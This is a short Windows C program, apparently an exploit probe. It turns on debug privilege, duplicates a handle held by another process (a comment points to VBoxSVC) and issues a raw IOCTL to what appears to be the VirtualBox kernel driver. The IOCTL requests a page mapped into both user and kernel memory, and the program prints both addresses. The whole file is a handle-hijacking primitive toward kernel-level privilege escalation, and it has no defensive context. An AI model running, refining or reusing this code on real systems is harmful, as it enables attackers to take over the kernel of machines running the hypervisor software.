#include <stdlib.h>
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>
#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"advapi32.lib")

typedef struct tagSH { ULONG PID; UCHAR OTI; UCHAR Flags; USHORT Handle; PVOID Obj; ACCESS_MASK Acc; } SH;
typedef struct tagSHI { ULONG Count; SH H[1]; } SHI;

static void EnableDebug(void) {
    HANDLE tok = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &tok);
    TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid);
    AdjustTokenPrivileges(tok, FALSE, &tp, 0, NULL, NULL);
    CloseHandle(tok);
}

#pragma pack(push,1)
typedef struct { DWORD c,sc,cbIn,cbOut,fl; int rc; } VBHdr;
typedef struct { VBHdr h; DWORD cPages,fKernel,fUser,iTLB; } VBAllocIn;
typedef struct { VBHdr h; UINT64 pvR3,pvR0; } VBAllocOut;
#pragma pack(pop)

int main(int argc, char* argv[]) {
    DWORD pid = argc > 1 ? (DWORD)atoi(argv[1]) : 0;
    USHORT targH = argc > 2 ? (USHORT)strtoul(argv[2], NULL, 16) : 0;
    if (!pid) { puts("Usage: probe2.exe <pid> <handle_hex>"); return 1; }
    EnableDebug();
    HANDLE hp = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
    if (!hp) { printf("OpenProcess err=%u\n", GetLastError()); return 1; }
    HANDLE dup = NULL;
    if (!DuplicateHandle(hp, (HANDLE)(ULONG_PTR)targH, GetCurrentProcess(), &dup, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
        printf("DupHandle err=%u\n", GetLastError()); CloseHandle(hp); return 1;
    }
    printf("Duped handle 0x%04X -> local %p\n", (unsigned)targH, (void*)dup);

    // Try PAGE_ALLOC_EX with s.ck=0, s.sck=0 (already in-session via VBoxSVC)
    VBAllocIn req; memset(&req, 0, sizeof(req));
    req.h.cbIn  = sizeof(req);
    req.h.cbOut = (DWORD)(sizeof(VBAllocOut) + 8); // +8 for page phys addr
    req.cPages  = 1;
    req.fKernel = 1;
    req.fUser   = 1;
    req.iTLB    = 0;

    char resp[64]; memset(resp, 0, sizeof(resp));
    DWORD ret = 0;
    BOOL ok = DeviceIoControl(dup, 0x00228038UL, &req, sizeof(req), resp, sizeof(resp), &ret, NULL);
    DWORD err = GetLastError();
    printf("PageAlloc ioc=0x00228038 ok=%d err=%u ret=%u\n", (int)ok, (unsigned)err, (unsigned)ret);
    if (ok) {
        VBAllocOut* out = (VBAllocOut*)resp;
        printf("  rc=%d pvR3=0x%llX pvR0=0x%llX\n",
            out->h.rc, (unsigned long long)out->pvR3, (unsigned long long)out->pvR0);
    } else {
        printf("  first resp DWORD=0x%08X\n", *(DWORD*)resp);
    }
    CloseHandle(dup); CloseHandle(hp);
    return 0;
}

